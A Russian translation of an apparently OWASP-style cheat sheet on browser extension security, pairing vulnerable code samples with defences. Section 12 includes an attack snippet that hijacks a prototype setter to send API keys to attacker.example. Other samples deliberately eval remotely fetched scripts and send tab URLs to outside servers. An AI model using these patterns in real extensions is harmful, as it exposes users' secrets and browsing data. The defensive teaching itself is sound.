    Уязвимости браузерных расширений: Шпаргалка¶

    1. Избыточные разрешения¶

    Уязвимость: Избыточные разрешения¶

    Браузерные расширения иногда запрашивают больше разрешений, чем им реально необходимо. Это может открыть им доступ ко всем вкладкам, истории браузера и даже к конфиденциальным данным пользователя. При компрометации расширения подобная ситуация может повлечь серьёзные угрозы приватности.

    Пример: Избыточные разрешения¶

    {
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}

    Защита: Избыточные разрешения¶

    Следуйте принципу минимальных привилегий (PoLP) и запрашивайте только те разрешения, которые абсолютно необходимы. Используйте опциональные разрешения везде, где это возможно, вместо того чтобы сразу запрашивать полный доступ. Регулярно проводите аудит и удаляйте разрешения, которые больше не нужны.

    2. Утечка данных¶

    Уязвимость: Утечка данных¶

    Некоторые расширения непреднамеренно раскрывают данные пользователей, отправляя историю посещений или личную информацию на внешние серверы без надлежащих мер защиты.

    Пример: Утечка данных¶

    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});

    Защита: Утечка данных¶

    Всегда используйте HTTPS для всех коммуникаций, чтобы предотвратить перехват данных. Ограничьте сбор данных и обеспечьте прозрачность: чётко указывайте в Политике конфиденциальности, какие данные собираются. Реализуйте механизмы получения согласия пользователя перед сбором или отправкой любых персональных данных.

    3. Межсайтовый скриптинг (XSS)¶

    Уязвимость: Межсайтовый скриптинг (XSS)¶

    Если пользовательский ввод не проходит должную санитизацию, злоумышленники могут внедрять вредоносные скрипты в веб-страницы, потенциально похищая данные пользователей или выполняя несанкционированные действия.

    Пример: Межсайтовый скриптинг (XSS)¶

    let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // Без санитизации

    Защита: Межсайтовый скриптинг (XSS)¶

    Внедрите Content Security Policy (CSP) для блокировки встроенных скриптов. Используйте библиотеки вроде DOMPurify для санитизации пользовательского ввода перед его отображением. Избегайте использования innerHTML — вместо этого применяйте textContent, чтобы предотвратить выполнение внедрённых скриптов.

    4. Небезопасная передача данных¶

    Уязвимость: Небезопасная передача данных¶

    Некоторые расширения отправляют конфиденциальные данные по незащищённым HTTP-соединениям, что делает их уязвимыми для перехвата злоумышленниками.

    Пример: Небезопасная передача данных¶

    fetch('http://example.com/api/data');

    Защита: Небезопасная передача данных¶

    Всегда используйте HTTPS для внешних коммуникаций, чтобы предотвратить кражу данных. Перед обработкой проверяйте ответы сервера для обеспечения целостности данных.

    5. Внедрение кода¶

    Уязвимость: Внедрение кода¶

    Расширение, динамически загружающее скрипты из недоверенного источника, может быть использовано для внедрения и выполнения вредоносного кода.

    Пример: Внедрение кода¶

    let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);

    Защита: Внедрение кода¶

    Используйте CSP (Content Security Policy) для ограничения источников скриптов. Подробнее см. в CSP Cheat Sheet. Избегайте использования eval() и innerHTML, поскольку они могут выполнять вредоносный код. Отдавайте предпочтение API обмена сообщениями расширения вместо внедрения скриптов в веб-страницы.

    6. Вредоносные обновления¶

    Уязвимость: Вредоносные обновления¶

    Если расширение получает обновления с недоверенного сервера, злоумышленник может распространить вредоносные обновления для всех пользователей.

    Пример: Вредоносные обновления¶

    chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Небезопасно!
});

    Защита: Вредоносные обновления¶

    Подписывайте обновления расширения цифровыми подписями для обеспечения подлинности. Вместо того чтобы получать обновления внутри расширения, полагайтесь на обновления из маркетплейса расширений. См. "Don't inject or incorporate remote scripts". Реализуйте проверку целостности перед выполнением любого загруженного кода.

    7. Сторонние зависимости¶

    Уязвимость: Сторонние зависимости¶

    Использование устаревших или уязвимых сторонних библиотек в расширении может создавать угрозы безопасности, если в них обнаружены известные эксплойты.

    Пример: Сторонние зависимости¶

    {
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}

    Защита: Сторонние зависимости¶

    Регулярно проводите аудит сторонних зависимостей на предмет уязвимостей безопасности. Используйте инструменты вроде npm audit или OWASP Dependency-Check для выявления рисков. Отдавайте предпочтение активно поддерживаемым библиотекам с частыми обновлениями безопасности.

    8. Отсутствие Content Security Policy (CSP)¶

    Уязвимость: Отсутствие Content Security Policy (CSP)¶

    Без строгой CSP злоумышленники могут внедрять скрипты в веб-страницы расширения, повышая риск атак межсайтового скриптинга (XSS).

    Пример: Отсутствие Content Security Policy (CSP)¶

    {
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}

    Защита: Отсутствие Content Security Policy (CSP)¶

    Определите строгую CSP в файле manifest.json расширения. Используйте политики на основе nonce или хеша, чтобы разрешить выполнение только доверенных скриптов. Блокируйте выполнение встроенных скриптов и ограничьте источники стороннего контента.

    9. Небезопасное хранение данных¶

    Уязвимость: Небезопасное хранение данных¶

    Хранение конфиденциальных данных, таких как токены аутентификации, в localStorage или других незащищённых местах значительно облегчает злоумышленникам доступ к ним.

    Пример: Небезопасное хранение данных¶

    localStorage.setItem('token', 'my-secret-token'); // Без шифрования

    Защита: Небезопасное хранение данных¶

    Храните конфиденциальные данные в Chrome Storage API, который обеспечивает лучшую защиту, чем localStorage. Шифруйте данные перед их локальным сохранением. Никогда не храните API-ключи или учётные данные в коде расширения в открытом виде.

    10. Недостаточный контроль приватности¶

    Уязвимость: Недостаточный контроль приватности¶

    Если расширение не определяет чётко, как оно собирает и обрабатывает данные пользователей, это может привести к нарушениям приватности и несанкционированному использованию данных.

    Пример: Недостаточный контроль приватности¶

    {
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}

    Защита: Недостаточный контроль приватности¶

    Реализуйте чёткую политику конфиденциальности, объясняющую практики сбора данных. Предоставьте пользователям возможность отказаться от сбора данных. Раскрывайте практики передачи данных для соответствия GDPR, CCPA и другим нормативным требованиям в области конфиденциальности.

    11. Скимминг данных через DOM¶

    Уязвимость: Скимминг данных через DOM¶

    Когда расширение отображает конфиденциальную информацию пользователя непосредственно в DOM веб-страницы, эти данные становятся доступны собственным скриптам страницы.

    Этот риск существует вне зависимости от используемого метода — включая прямую манипуляцию DOM через JavaScript или внедрение компонентов, созданных с помощью таких фреймворков, как React.

    Вредоносная или скомпрометированная веб-страница может проинспектировать DOM, считать конфиденциальные данные (например, персональные данные, финансовые сведения, историю AI-чатов) и передать их злоумышленнику.

    Пример: Скимминг данных через DOM¶

    // content-script.js

// Конфиденциальные данные, полученные из фонового сервиса расширения
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// Это внедряет конфиденциальные данные напрямую в DOM страницы
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);

    Защита: Скимминг данных через DOM¶

    Избегайте отображения конфиденциальной информации непосредственно в DOM веб-страницы. Вместо этого отображайте конфиденциальные данные в элементах интерфейса, изолированных от контекста веб-страницы и контролируемых расширением.

    Используйте безопасные альтернативы:

    • Popup: отображайте информацию во всплывающем интерфейсе, который появляется при нажатии на иконку расширения.
    • Options Page: используйте специальную страницу настроек для отображения пользовательских данных или параметров.
    • Side Panel: используйте боковую панель для отображения постоянного интерфейса в отдельной панели, изолированной от содержимого страницы. (Для справки: «Side Panel» — термин Chromium; Firefox называет это «Sidebar».)

    Важно отметить, что использование Shadow DOM для инкапсуляции может оказаться недостаточной защитой, поскольку скрипты страницы могут получать доступ к «открытому» Shadow DOM. Более того, даже «закрытый» Shadow DOM не является безопасным, если вы рассматриваете другие браузерные расширения как угрозу в рамках вашей модели безопасности. Это связано с тем, что расширения могут пробираться через «закрытый» Shadow DOM с помощью openOrClosedShadowRoot() API.

    Поэтому использование по-настоящему отдельных пользовательских интерфейсов, контролируемых расширением, является наиболее надёжным способом защиты.

    12. Скимминг данных через прототипы¶

    Уязвимость: Скимминг данных через прототипы¶

    Контентный скрипт расширения выполняется в «изолированном мире» — контексте JavaScript, отделённом от контекста веб-страницы. Вместе с тем существуют способы выполнить скрипты расширения в «основном мире» — контексте веб-страницы. Например, расширение может напрямую внедрить тег <script> в DOM с атрибутом src, указывающим на скрипт из веб-доступных ресурсов.

    Когда расширение использует конфиденциальную информацию пользователя в скриптах, выполняемых в контексте веб-страницы, эти данные становятся доступны скриптам страницы. Поэтому, если веб-страница скомпрометирована или является вредоносной, данные будут похищены.

    Причина, по которой данные становятся доступны, заключается в том, что глобальные объекты контекста (иногда называемые «встроенными объектами», «примордиалами» или «прототипами») могут быть перезаписаны так, чтобы вести себя не так, как обычно. Это явление известно как «загрязнение прототипов», «переопределение прототипов» и т.п.

    Это означает, что вредоносная или скомпрометированная веб-страница может перезаписать глобальные объекты в своём контексте, чтобы похитить любые обрабатываемые ими данные. Обратите внимание, что объекты здесь включают практически всё в контексте, в том числе функции. Таким образом, если внедрённый скрипт расширения использует эти перезаписанные объекты с конфиденциальными данными, он непреднамеренно вызовет вредоносный код, что приведёт к утечке этих данных.

    Пример: Скимминг данных через прототипы¶

    // Вредоносный скрипт перезаписывает сеттер 'apiKey' всех объектов,
// чтобы отправлять устанавливаемое значение на сервер злоумышленника.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Скрипт расширения, выполняемый в контексте веб-страницы.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // Сеттер 'apiKey' уже отравлен,
    // и строка ниже запускает вредоносный код — данные немедленно отправляются.
    window.apiController.apiKey = data.apiKey;
  }
})

    Защита: Скимминг данных через прототипы¶

    Не используйте контекст веб-страницы там, где даже на мгновение обрабатывается конфиденциальная информация пользователя. Если взаимодействие со скриптами в контексте веб-страницы необходимо, передавайте только несекретные, существенные данные. Например, передавайте только результат проверки, а не весь секретный токен. Это правило применяется даже при использовании window.postMessage, поскольку он также может быть перезаписан, а вредоносные скрипты могут добавлять слушатели события message.

    Обратите внимание, что не рекомендуется пытаться получить нативные (незаписанные) прототипы с помощью различных хитростей. Хотя существуют способы получить нативные прототипы в контексте, где также выполняются другие скрипты, обходные пути для этих мер защиты (то есть способы принудить другие скрипты использовать перезаписанные прототипы) постоянно изобретаются.

    Также не стоит предполагать, что скрипт расширения может использовать нативные прототипы, даже если он выполняется на этапе document_start. По крайней мере в Chromium известно, что контекст вновь созданного iframe может быть изменён скриптом веб-страницы ДО того, как скрипт расширения начнёт работу в iframe даже на этапе document_start (официальный отчёт об ошибке).

    13. Небезопасная передача сообщений¶

    Уязвимость: Небезопасная передача сообщений¶

    Браузерные расширения часто используют передачу сообщений (chrome.runtime.sendMessage/onMessage) между контекстами с низкими привилегиями (контентные скрипты, Popup) и высокопривилегированным Service Worker (Background). Если Service Worker не проверяет источник или URL отправителя, скомпрометированная веб-страница может отправлять вредоносные сообщения, вынуждая расширение выполнять привилегированные действия (например, извлекать конфиденциальные данные или API-ключи).

    Пример: Небезопасная передача сообщений¶

    // В Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // Без проверки отправителя
    // Вредоносный контентный скрипт/веб-страница может вызвать это.
    fetch(SECRET_API_URL);
  }
});

    Защита: Небезопасная передача сообщений¶

    Относитесь ко всем входящим сообщениям как к недоверенным данным. В Service Worker всегда:

    • Проверяйте sender.id, чтобы убедиться, что сообщение исходит от вашего собственного расширения.
    • Проверяйте sender.url или sender.origin, чтобы ограничить круг страниц расширения или контентных скриптов, которые могут взаимодействовать.
    • Не позволяйте веб-страницам косвенно влиять на привилегированную логику через контентные скрипты.
    • Выполняйте строгую проверку и составление списка разрешённых значений для request.action и всех параметров запроса.

    Chrome прямо указывает, что контентные скрипты менее надёжны, чем страницы расширения, и должны рассматриваться соответствующим образом. Безопасный пример:

    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});

    Заключение¶

    Соблюдая эти лучшие практики безопасности, разработчики смогут создавать более защищённые браузерные расширения и ограждать пользователей от угроз их приватности и безопасности. При разработке расширений всегда отдавайте приоритет принципу минимальных привилегий, шифрованию и безопасным практикам программирования.
